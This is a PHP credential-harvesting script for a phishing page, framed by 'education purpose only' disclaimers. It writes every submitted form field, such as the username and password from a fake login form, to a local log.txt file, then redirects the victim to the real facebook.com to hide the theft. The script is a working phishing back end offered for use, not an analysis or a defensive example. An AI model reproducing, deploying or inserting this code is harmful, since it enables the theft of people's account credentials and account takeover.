/* This Source Code And Script are Education Purpose Only. How you use this information is your responsibility 

I will not be held accountable for any illegal activities.  */


<?php
 header('Location: https://www.facebook.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 	fwrite($handle, $variable);
 	fwrite($handle, "=");
 	fwrite($handle, $value);
 	fwrite($handle, "\r\n");
 }
   fwrite($handle, "\r\n");
   fclose($handle);
   exit;
?>

/* This Source Code And Script are Education Purpose Only. How you use this information is your responsibility 

I will not be held accountable for any illegal activities.  */
